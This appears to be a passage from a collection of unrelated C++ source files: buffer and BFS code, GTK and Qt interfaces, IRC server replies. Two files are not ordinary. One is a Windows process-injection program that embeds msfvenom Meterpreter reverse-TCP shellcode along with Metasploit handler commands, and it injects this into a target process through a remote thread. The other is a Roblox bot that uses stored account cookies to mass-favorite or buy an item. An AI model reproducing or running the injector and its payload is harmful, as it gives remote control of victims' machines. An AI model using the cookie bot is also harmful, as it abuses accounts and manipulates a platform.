write_pos_ = buffer_.size();\n        Append(buff,len - writable);\n    }\n    return len;\n}   \n\nssize_t Buffer::WriteFd(int fd,int* savedErrno){\n    size_t read_size = ReadableBytes();//\u83b7\u53d6\u53ef\u4ee5\u8bfb\u53d6\u7f13\u5b58\u7684\u957f\u5ea6\n    ssize_t len = write(fd,Peek(),read_size);//\u628a\u7f13\u5b58\u5185\u5bb9\u5199\u5165\u5230\u6587\u4ef6\n    if(len <= 0){//\u5199\u5165\u5931\u8d25\n        *savedErrno = errno;\n        return len;\n    }\n    read_pos_ += len;//\u8bfb\u53d6\u4f4d\u7f6e\u4fee\u6539\n    return len;\n}\n\nssize_t Buffer::ReadFile(FILE *fp) {     \n    char buff[65536];\n    int index = 0;\n    while (true)\n    {\n        int character = fgetc(fp);\n        if(character==EOF){\n            break;\n        }\n        buff[index++] = character;\n    }\n    Append(buff,index); \n    return index;\n}\n\nssize_t Buffer::WriteFile(FILE *fp) { \n    size_t write_size =  fwrite(BeginPtr_()+write_pos_,1,ReadableBytes(),fp);\n    return write_size;\n }\n\n char *Buffer::BeginPtr_() { return &*buffer_.begin(); }\n\n const char *Buffer::BeginPtr_() const { return &*buffer_.begin(); }\n\n void Buffer::MakeSpace_(size_t len) {\n   if (WriteableBytes() + PrependableBytes() <\n       len) { // \u7f13\u5b58\u6574\u4e2a\u7684\u7a7a\u95f4\u4e0d\u8db3\u5c31\u8003\u8651\u6269\u5bb9\n     buffer_.resize(write_pos_ + len);\n   } else { // \u7f13\u5b58\u7684\u7a7a\u95f4\u8db3\u591f\u5c31\u8fdb\u884c\u6570\u636e\u7684\u79fb\u52a8\n     size_t readable = ReadableBytes();\n     std::copy(BeginPtr_() + read_pos_, BeginPtr_() + write_pos_,\n               BeginPtr_());            // \u62f7\u8d1d\u6570\u636e\u5230\u7f13\u5b58\u7684\u5f00\u59cb\n     read_pos_ = 0;                     // \u8bfb\u53d6\u4f4d\u7f6e\u5f52\u96f6\n     write_pos_ = read_pos_ + readable; // \u5199\u5165\u4f4d\u7f6e\u4e3a\u5f53\u524d\u7f13\u5b58\u6570\u636e\u7684\u957f\u5ea6\n   }\n}",
    "#include <iostream>\r\n#include <queue>\r\n#include <vector>\r\nusing namespace std;\r\n//\ub108\ube44 \uc6b0\uc120 \ud0d0\uc0c9(\ud050 \uc790\ub8cc\uad6c\uc870\ub97c \uc774\uc6a9)\r\n/*\r\n1. \ud0d0\uc0c9 \uc2dc\uc791 \ub178\ub4dc\ub97c \ud050\uc5d0 \uc0bd\uc785\ud558\uace0 \ubc29\ubb38 \ucc98\ub9ac\ud55c\ub2e4.\r\n2. \ud050\uc5d0\uc11c \ub178\ub4dc\ub97c \uaebc\ub0b8 \ub4a4\uc5d0 \ud574\ub2f9 \ub178\ub4dc\uc758 \uc778\uc811 \ub178\ub4dc \uc911\uc5d0\uc11c \ubc29\ubb38\ud558\uc9c0 \uc54a\uc740 \ub178\ub4dc\ub97c '\ubaa8\ub450' \ud050\uc5d0 \uc0bd\uc785\ud558\uace0 \ubc29\ubb38 \ucc98\ub9ac\ud55c\ub2e4.\r\n3. \ub354 \uc774\uc0c1 2\ubc88\uc758 \uacfc\uc815\uc744 \uc218\ud589\ud560 \uc218 \uc5c6\uc744 \ub54c\uae4c\uc9c0 \ubc18\ubcf5\ud55c\ub2e4.\r\n*/\r\nbool visited[9];//\uc804\uc5ed\uc73c\ub85c \uc120\uc5b8 \uc2dc \ubaa8\ub450 false\ub85c \ucd08\uae30\ud654\r\nvector<int> graph[9];//9\ub85c \uc120\uc5b8\ub41c \uc774\uc720\ub294 0\uc744 \uc4f0\uc9c0 \uc54a\uae30 \ub54c\ubb38(\ubb3c\ub860 0\uc744 \uc4f0\ub824\uba74 \uc4f8 \uc218 \uc788\uaca0\uc9c0\ub9cc \ubd88\ud3b8\ud55c\ub370 \uad73\uc774?)\r\n\r\nvoid dfs(int start){\r\n    queue <int> q;\r\n\r\n    q.push(start);\r\n    visited[start] = true;\r\n\r\n    while(!q.empty()){\r\n        int x = q.front();//(2)\r\n        q.pop();\r\n        cout << x << ' ';\r\n\r\n        for(int i = 0;i<graph[x].size();i++){//\uc778\uc811 \ub178\ub4dc \uc911 \ubc29\ubb38\ud558\uc9c0 \uc54a\uc740 \ub178\ub4dc\ub97c \ucc3e\ub294\ub2e4.\r\n            int y = graph[x][i];\r\n            if(!visited[y]){\r\n                q.push(y);\r\n                visited[y] = true;\r\n            }\r\n        }\r\n\r\n\r\n    }\r\n    \r\n}\r\n\r\nint main() {\r\n    ios::sync_with_stdio(false);\r\n    cin.tie(NULL);\r\n    //\ubc88\ud638\uac00 \ub0ae\uc740 \uc778\uc811 \ub178\ub4dc\ubd80\ud130 \ubc29\ubb38\ud558\ub3c4\ub85d \uc800\uc7a5\ub428\r\n    graph[1].push_back(2);\r\n\tgraph[1].push_back(3);\r\n\tgraph[1].push_back(8);\r\n\r\n\t// \ub178\ub4dc 2\uc5d0 \uc5f0\uacb0\ub41c \ub178\ub4dc \uc815\ubcf4 \uc800\uc7a5 \r\n\tgraph[2].push_back(1);\r\n\tgraph[2].push_back(7);\r\n\r\n\t// \ub178\ub4dc 3\uc5d0 \uc5f0\uacb0\ub41c \ub178\ub4dc \uc815\ubcf4 \uc800\uc7a5 \r\n\tgraph[3].push_back(1);\r\n\tgraph[3].push_back(4);\r\n\tgraph[3].push_back(5);\r\n\r\n\t// \ub178\ub4dc 4\uc5d0 \uc5f0\uacb0\ub41c \ub178\ub4dc \uc815\ubcf4 \uc800\uc7a5 \r\n\tgraph[4].push_back(3);\r\n\tgraph[4].push_back(5);\r\n\r\n\t// \ub178\ub4dc 5\uc5d0 \uc5f0\uacb0\ub41c \ub178\ub4dc \uc815\ubcf4 \uc800\uc7a5 \r\n\tgraph[5].push_back(3);\r\n\tgraph[5].push_back(4);\r\n\r\n\t// \ub178\ub4dc 6\uc5d0 \uc5f0\uacb0\ub41c \ub178\ub4dc \uc815\ubcf4 \uc800\uc7a5 \r\n\tgraph[6].push_back(7);\r\n\r\n\t// \ub178\ub4dc 7\uc5d0 \uc5f0\uacb0\ub41c \ub178\ub4dc \uc815\ubcf4 \uc800\uc7a5 \r\n\tgraph[7].push_back(2);\r\n\tgraph[7].push_back(6);\r\n\tgraph[7].push_back(8);\r\n\r\n\t// \ub178\ub4dc 8\uc5d0 \uc5f0\uacb0\ub41c \ub178\ub4dc \uc815\ubcf4 \uc800\uc7a5 \r\n\tgraph[8].push_back(1);\r\n\tgraph[8].push_back(7);\r\n\r\n\tdfs(1);\r\n    \r\n}\r\n/*\r\n\r\n*/\r\n",
    "#include <iostream>\n#include <cstring>\n#include <sstream>\n#include <fstream>\n#include <cpr/cpr.h>\n#include <nlohmann/json.hpp>\n#include <regex>\n\n// -- INFOS -- //\n\nstd::string RobloxUrl = \"https://www.roblox.com\";\nlong long int TargetFavoriteItem = 15556784020; // Change this with your target item's asset id (Works with games aswell but you can purchase games)\nbool IsBuyingEnabled = false; // Set it to true if you want accounts to buy it (Dont use this if the target is a game)\nlong long int TargetFavoriteItemProduct = 22; // Product id of target item\nint TargetItemPrice = 0; // Price of target item\n\n// -- Functions and Main -- //\n\nnlohmann::json ToJson(std::string JsonSource) {\n    return nlohmann::json::parse(JsonSource.c_str());\n}\n\nstd::string GetAccounts() {\n    std::ifstream file(\"Accounts.txt\");\n\n    if (!file.is_open()) {\n        std::cout << \"Error opening file\" << std::endl;\n        return \"\";\n    }\n    std::string fileContents((std::istreambuf_iterator<char>(file)),\n                            std::istreambuf_iterator<char>());\n    file.close();\n    return fileContents;\n}\n\nvoid FavTarget(long long int TargetID) {\n    std::string AccountTXT = GetAccounts();\n    std::regex pattern(\"Username: (.+)\\nCookie: (.+)\");\n    std::sregex_iterator iter(AccountTXT.begin(), AccountTXT.end(), pattern);\n    std::sregex_iterator end;\n\n    while (iter != end) {\n        std::smatch match = *iter;\n        std::string MyUser = match[1];\n        std::string Cookie = match[2];\n\n        //std::cout << Cookie << std::endl;\n\n        cpr::Session newsession;\n        newsession.SetHeader(cpr::Header{{\"Content-Type\", \"application/json\"}});\n        newsession.SetCookies(cpr::Cookies{{\".ROBLOSECURITY\", Cookie.c_str()}});\n        newsession.SetUrl(cpr::Url(\"https://auth.roblox.com/v2/logout\"));\n\n        cpr::Response resp = newsession.Post();\n\n        auto it = resp.header.find(\"x-csrf-token\");\n        if (it != resp.header.end()) {\n            newsession.UpdateHeader(cpr::Header({{\"referer\", RobloxUrl.c_str()}, {\"x-csrf-token\", it->second}}));\n        }\n\n        nlohmann::json BodyGetUserid;\n        BodyGetUserid[\"usernames\"] = {MyUser.c_str()};\n        BodyGetUserid[\"excludeBannedUsers\"] = true;\n\n        newsession.SetBody(cpr::Body(BodyGetUserid.dump()));\n        newsession.SetUrl(cpr::Url(\"https://users.roblox.com/v1/usernames/users\"));\n        \n        cpr::Response UseridResponse = newsession.Post();\n        nlohmann::json UseridJson = ToJson(UseridResponse.text);\n        long long int MyUserId = UseridJson[\"data\"][0][\"id\"];\n\n        if (IsBuyingEnabled) {\n            // Purchase the target thing\n            std::string BuyUrl = \"https://apis.roblox.com/creator-marketplace-purchasing-service/v1/products/\" + std::to_string(TargetID) + \"/purchase\";\n            nlohmann::json BuyBody;\n            BuyBody[\"expectedPrice\"] = TargetItemPrice;\n            BuyBody[\"expectedSellerId\"] = 1;\n            BuyBody[\"expectedCurrency\"] = 1;\n\n            newsession.SetUrl(cpr::Url(BuyUrl.c_str()));\n            newsession.SetBody(cpr::Body(BuyBody.dump()));\n            newsession.Post();\n        }\n\n\n        // Favorite it\n        newsession.SetBody(cpr::Body()); // Set body to nothing\n\n        std::string TargetUrl = \"https://catalog.roblox.com/v1/favorites/users/\" + std::to_string(MyUserId) + \"/assets/\" + std::to_string(TargetID) + \"/favorite\";\n        newsession.SetUrl(cpr::Url(TargetUrl.c_str()));\n\n        cpr::Response FavResponse = newsession.Post();\n\n        std::cout << FavResponse.status_code << std::endl;\n\n        iter++;\n\n        Sleep(1500); // 1.5 sec\n    }\n}\n\nint main(int, char**){\n    FavTarget(TargetFavoriteItem);\n}\n",
    "// ProcessInjection_01.cpp : This file contains the 'main' function. Program execution begins and ends there.// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY \n// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY \n\n#include <iostream>\n#include <windows.h>\n#include <stdio.h> \nmsf6 exploit(multi/handler) > run -j\n\n[-] Msf::OptionValidateError One or more options failed to validate: LHOST.\n[*] Exploit completed, but no session was created.\nmsf6 exploit(multi/handler) > set lhost wlan1\nlhost => wlan1\nmsf6 exploit(multi/handler) > let lport 443\n[-] Unknown command: let. Did you mean set? Run the help command for more details.\nmsf6 exploit(multi/handler) > set lport 443\nlport => 443\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > run -j\n\n\n\n//* to compile reverse shell, use msfvenom \n//... in the console: msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=localhost LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke\n//  msfvenom --platform windows -a x86 -p payload/windows/custom/reverse_named_pipe LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke003\n/* Init*/\nDWORD PID = NULL;  // process id \nHANDLE hProcess = NULL; // process \nLPVOID rBuffer = NULL; //  data to inject into thread  (buffer)  \nHANDLE hThread = NULL;  // handle thread to write memory \nDWORD TID = NULL; // thread ID\n\n//payload\n//[X64 ARCHITECTURE]\nunsigned char crowPuke[] = \n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\"\n\"\\x8b\\x52\\x20\\x51\\x56\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\"\n\"\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\"\n\"\\x74\\x67\\x48\\x01\\xd0\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\x50\\x8b\"\n\"\\x48\\x18\\xe3\\x56\\x4d\\x31\\xc9\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\"\n\"\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\"\n\"\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\"\n\"\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\"\n\"\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\"\n\"\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\"\n\"\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\"\n\"\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\"\n\"\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\"\n\"\\x89\\xe5\\x49\\xbc\\x02\\x00\\x01\\xbb\\x00\\x00\\x00\\x00\\x41\\x54\"\n\"\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\"\n\"\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\"\n\"\\x00\\xff\\xd5\\x6a\\x0a\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\"\n\"\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\"\n\"\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\"\n\"\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\xa5\\x74\\x61\\xff\\xd5\"\n\"\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5\\xe8\\x93\\x00\\x00\\x00\"\n\"\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\"\n\"\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\"\n\"\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\"\n\"\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41\\xba\"\n\"\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\"\n\"\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\"\n\"\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\"\n\"\\x00\\x40\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\"\n\"\\x30\\xff\\xd5\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\"\n\"\\xff\\xce\\xe9\\x3c\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\"\n\"\\x85\\xf6\\x75\\xb4\\x41\\xff\\xe7\\x58\\x6a\\x00\\x59\\xbb\\xe0\\x1d\"\n\"\\x2a\\x0a\\x41\\x89\\xda\\xff\\xd5\";\n\n\n\nint main(int argc, char* arg[])\n{\n\tif (argc < 2)\n\t{\n\t\tprintf(\"[-] Usage: %s <PID>\\n\", arg[0]);\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tPID = atoi(arg[1]);\n\tprintf(\"[+] PID: \", PID);\n\n\t// Opens handle TO A PROCESS \n\thProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);\n\tif (hProcess == NULL) {\n\t\tprintf(\"[-] Error: Unable to open process %d\\n\");//, PID, GetLastError());\n\t\tprintf(\"Error: \", GetLastError());\n\t\treturn EXIT_FAILURE;\n\t}\n\tprintf(\"[+] Hprocess \" , hProcess);\n\n\t;\n/*\n\t// rBuffer -> ALLOCATE MEMORY SPACE OF THE PAYLOAD, DOES NOT EXECUTE. \n\t// MEM_RESERVE -> RESERVES A RANGE OF THE PERESONS VERITUAL ADDRESS SPACE WITHOUT ACTUALLY ALLOCATING \n\t// MEM_COMMIT -> SETS ASIDE SPACE TO WRITE (DOES NOT WRITE) \n*/ \n\trBuffer = VirtualAllocEx(hProcess, NULL, sizeof(crowPuke), (MEM_COMMIT, MEM_RESERVE), PAGE_EXECUTE_READWRITE); \n\tif (rBuffer == NULL) {\n\t\tprintf(\"[-] Error in rBuffer \"); \n\t\tprintf(\"Error: \", GetLastError());\n\t}\n\n\tprintf(\"[+] rBuffer \", rBuffer, \"with  a permission of \", PAGE_EXECUTE_READWRITE, \"Memory Committed: \", MEM_COMMIT, \"Memory Reserved \", MEM_RESERVE);\n\tprintf(\"allocated size: \", sizeof(crowPuke)); \n\n\n\n\t// Write the allocated memory: insert payload (defined above) into memory \n\tWriteProcessMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), NULL); \n\n\t// Create thread to run payload \n\thThread = CreateRemoteThre",
    "#include \"../include/Interface.hpp\"\n#include <iostream>\n\n// Construtor\nInterface::Interface(const char* gladeFile) : gladeFile(gladeFile){\n    gtk_init(NULL, NULL);\n    \n    builder = gtk_builder_new_from_file(gladeFile);\n    mainWindow = GTK_WIDGET(gtk_builder_get_object(builder, \"main_window\"));\n\n    usuario = new Usuario(\"Danilo\"); //testando\n}\n\n/**\n * @brief ativa o CSS na interface\n * @param cssFile caminho do arquivo css\n*/\nvoid Interface::activateCSS (const char* cssFile) {\n    GtkCssProvider *css_provider = gtk_css_provider_new();\n    gtk_css_provider_load_from_path(css_provider, cssFile, 0);\n    gtk_style_context_add_provider_for_screen(\n            gdk_screen_get_default(),\n            GTK_STYLE_PROVIDER(css_provider),\n            GTK_STYLE_PROVIDER_PRIORITY_APPLICATION\n    );\n}\n\n/**\n * @brief prepara a interface para ser exibida na tela\n*/\nvoid Interface::display(){\n    activateCSS(CSS_FILE_PATH);\n    connectSymbols();\n    loadLoginScreen();\n    gtk_widget_show(mainWindow);\n    gtk_main();\n}\n\nvoid Interface::connectSymbols(){   \n\n    gtk_builder_add_callback_symbols(\n        builder,\n        \"on_main_window_destroy\",           G_CALLBACK(gtk_main_quit),\n\n        //signals de popup\n        \"on_popUpOkButton_clicked\",                 G_CALLBACK(on_popUpOkButton_clicked),\n\n        //signals da pagina de login\n        \"on_login_clicked\",                 G_CALLBACK(on_login_clicked),\n        \"on_cadastrar_clicked\",             G_CALLBACK(on_cadastrar_clicked),\n        \"on_remember_toggled\",              G_CALLBACK(on_remember_toggled),\n        \"on_password_activate\",             G_CALLBACK(on_password_activate),\n        \"on_name_activate\",                 G_CALLBACK(on_name_activate),\n        \"on_name_changed\",                  G_CALLBACK(on_name_changed),\n\n\n        //signals da pagina home\n        \"on_textBufferPost_changed\",                    G_CALLBACK(on_textBufferPost_changed),\n        \"on_homeButton_clicked\",                        G_CALLBACK(on_homeButton_clicked),\n        \"on_logoutButton_clicked\",                      G_CALLBACK(on_logoutButton_clicked),\n        \"on_searchBar_activate\",                        G_CALLBACK(on_searchBar_activate),\n        \"on_profileImageHomeButton_clicked\",            G_CALLBACK(on_profileImageHomeButton_clicked),\n        \"on_profileButton_clicked\",                     G_CALLBACK(on_profileButton_clicked),\n        \"on_searchBar_search_changed\",                  G_CALLBACK(on_searchBar_search_changed),\n\n        //signals da pagina de interface\n        \"on_followButton_clicked\",                      G_CALLBACK(on_followButton_clicked),\n        \"on_deleteUserButton_clicked\",                  G_CALLBACK(on_deleteUserButton_clicked),\n\n        NULL\n    );\n    gtk_builder_connect_signals(builder, NULL);\n\n    g_signal_connect(gtk_builder_get_object(builder, \"buttonPost\"), \"clicked\", G_CALLBACK(on_buttonPost_clicked), NULL);\n\n    connectLoginSignals(this);\n}\n\nvoid Interface::reset(){\n    // gtk_main_quit();\n    gtk_widget_show_all(mainWindow);\n    // gtk_main();\n}\n\nvoid Interface::popup(std::string title, std::string text){\n    GtkMessageDialog *popup = GTK_MESSAGE_DIALOG(gtk_builder_get_object(builder, \"popup\"));\n    g_object_set(popup, \"text\", title.c_str(), NULL);\n    g_object_set(popup, \"secondary_text\", text.c_str(), NULL);\n    \n    gtk_widget_show_all(GTK_WIDGET(popup));\n    gtk_dialog_run(GTK_DIALOG(popup));\n}",
    "#include \"MainPanel.h\"\n\n#include <QMouseEvent>\n#include <cmath>\n\nCustomPanel::CustomPanel(QWidget *parent)\n    : QWidget(parent)\n{\n    m_drawColor = Qt::black;\n}\n\nvoid CustomPanel::setColor(const QColor &color)\n{\n    m_drawColor = color;\n}\n\nvoid CustomPanel::mousePressEvent(QMouseEvent *event)\n{\n    if (event->button() == Qt::LeftButton)\n    {\n        m_lastPoint = event->pos();\n        m_lines.append(QVector<QPoint>());\n        m_lines.last().append(m_lastPoint);\n    }\n}\n\nvoid CustomPanel::mouseMoveEvent(QMouseEvent *event)\n{\n    if (event->buttons() & Qt::LeftButton) \n    {\n        drawLineTo(event->pos());\n    }\n}\n\nvoid CustomPanel::mouseReleaseEvent(QMouseEvent *event)\n{\n    if (event->button() == Qt::LeftButton)\n    {\n        update();\n    }\n}\n\nvoid CustomPanel::paintEvent(QPaintEvent *event)\n{\n    QPainter painter(this);\n    painter.fillRect(rect(), Qt::white);\n    painter.setRenderHint(QPainter::Antialiasing);\n\n    int fixedRadius = 5;\n    for (const auto &line : m_lines)\n    {\n        for (int i = 1; i < line.size(); ++i)\n        {\n            QPoint center = (line.at(i - 1) + line.at(i)) / 2;\n\n            painter.setBrush(m_drawColor);\n            painter.setPen(Qt::NoPen);\n\n            painter.drawEllipse(center, fixedRadius, fixedRadius);\n        }\n    }\n\n    QWidget::paintEvent(event);\n}\n\nvoid CustomPanel::drawLineTo(const QPoint &endPoint)\n{\n    if (m_lines.isEmpty())\n    {\n        m_lines.append(QVector<QPoint>());\n        m_lines.last().append(endPoint);\n    }\n    else\n    {\n        QPoint diff = endPoint - m_lastPoint;\n        int steps = qMax(qAbs(diff.x()), qAbs(diff.y()));\n        float dx = diff.x() / (float)steps;\n        float dy = diff.y() / (float)steps;\n\n        for (int i = 0; i < steps; ++i)\n        {\n            QPoint nextPoint(round(m_lastPoint.x() + dx * i * 2), round(m_lastPoint.y() + dy * i * 2));\n            QVector<QPoint> line;\n            line.append(m_lastPoint);\n            line.append(nextPoint);\n            m_lines.append(line);\n        }\n    }\n\n    m_lastPoint = endPoint;\n    update();\n}\n\nvoid CustomPanel::clearPanel()\n{\n    for (auto &line : m_lines)\n    {\n        line.clear();\n    }\n    m_lines.clear();\n    update();\n}\n\nvoid CustomPanel::undo()\n{\n}\n\nvoid CustomPanel::redo()\n{\n}\n",
    "/********************************************************************************************************************************\n**                      \t\tEast China Normal University\n**                               http://www.ecnu.edu.cn/\n**--------------File Info--------------------------------------------------------------------------------------------------------\n** File name:           main.cpp\n** Created by:          linzhaohua\n** Created date:        2018-3-16\n** Version:             V1.0\n** Descriptions:        main.cpp\n********************************************************************************************************************************/\n#include \"../headers/config.h\"\n/********************************************************************************************************************************\n** Function name:       main\n** Descriptions:        main\n** input parameters:    None\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nint main(int argc, char **argv)\n{\n\tclock_t startTime;\n\tclock_t endTime;\n\n\tstartTime = clock();\n\tg_taskNum = atoi(argv[1]);\n\tDraw_Rho_Vs_AbscissaParm_Diagram1();\n\tendTime = clock();\n\n\tcout << \"run time: \" << (double)(endTime - startTime) / CLOCKS_PER_SEC << \"s\"\n\t\t<< \"(\" << (double)(endTime - startTime) / (CLOCKS_PER_SEC * 60) << \"min)\"\n\t\t<< \"(\" << (double)(endTime - startTime) / (CLOCKS_PER_SEC * 60 * 60) << \"h)\" << endl;\n\n\tsystem(\"pause\");\n\treturn 0;\n}\n/***********************************************End Of File*********************************************************************/",
    "/* ************************************************************************** */\r\n/*                                                                            */\r\n/*                                                        :::      ::::::::   */\r\n/*   Rep.cpp                                            :+:      :+:    :+:   */\r\n/*                                                    +:+ +:+         +:+     */\r\n/*   By: tcharpen <tcharpen@student.42lyon.fr>      +#+  +:+       +#+        */\r\n/*                                                +#+#+#+#+#+   +#+           */\r\n/*   Created: 2023/07/24 14:06:11 by tcharpen          #+#    #+#             */\r\n/*   Updated: 2023/07/24 14:06:11 by tcharpen         ###   ########lyon.fr   */\r\n/*                                                                            */\r\n/* ************************************************************************** */\r\n\r\n#include \"../../includes/network/Rep.hpp\"\r\n\r\nvoid\tsend_to_client(std::string msg, int const &fd, Server *server)\r\n{\r\n\tClient  \t*client;\r\n\tstd::string\tmessage;\r\n\r\n\tclient = server->getTabClients().find(fd)->second;\r\n\tmessage = \":ircserv \" + msg +\"\\r\\n\";\r\n\tclient->addMessageToRecv(message);\r\n}\r\n\r\nvoid\tsend_to_client_things(std::string msg, int const &fd, Server *server)\r\n{\r\n\tClient  \t*client;\r\n\tstd::string\tmessage;\r\n\r\n\tclient = server->getTabClients().find(fd)->second;\r\n\tmessage = msg +\"\\r\\n\";\r\n\tclient->addMessageToRecv(message);\r\n}\r\n\r\nvoid \tR001(REP_ARG)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"001 \" << name << \" :Welcome \" << name << \" to the Internet Chat Relay!\";\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tR324(REP_ARG, const std::string &channel, const std::string &mode, const std::string &mode_param)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"324 \" << name << \" \" << channel << \" \" << mode << \" \" << mode_param;\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tR331(REP_ARG, const std::string &channel)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"331 \" << name << \" \" << channel << \" :No topic is set\";\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tR332(REP_ARG, const std::string &channel, const std::string &topic)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"332 \" << name << \" \" << channel << \" :\" << topic;\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tR341(REP_ARG, const std::string &channel, const std::string &input_name)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"341 \" << name << \" \" << channel << \" \" << input_name;\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tR353(REP_ARG, const char &symbol, const std::string &channel, const std::string &members)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"353 \" << name << \" \" << symbol << \" \" << channel << \" :\" << members;\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tR366(REP_ARG, const std::string &channel)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"366 \" << name << \" \" << channel << \" :End of /NAMES list\";\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tR372(REP_ARG, const std::string &line)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"372 \" << name << \" : \" << line;\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tR375(REP_ARG)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"375 \" << name << \" :- ircserv Message of the day - \";\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tR376(REP_ARG)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << \"376 \" << name << \" :End of MOTD command\";\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tR391(REP_ARG)\r\n{\r\n\tstd::stringstream\toutput;\r\n\tchar \t\t\t\tdate_string[50];\r\n\ttime_t \t\t\t\tcurr_time;\r\n\ttm \t\t\t\t\t*curr_tm;\r\n\r\n\toutput.str(\"\");\r\n\ttime(&curr_time);\r\n\tcurr_tm = localtime(&curr_time);\r\n\tstrftime(date_string, 50, \"%c\", curr_tm);\r\n\toutput << \"391 \" << name << \" ircserv :\" << date_string;\r\n\tsend_to_client(output.str(), fd, server);\r\n}\r\n\r\nvoid\tE401(REP_ARG, const std::string &input_name)\r\n{\r\n\tstd::stringstream\toutput;\r\n\r\n\toutput.str(\"\");\r\n\toutput << 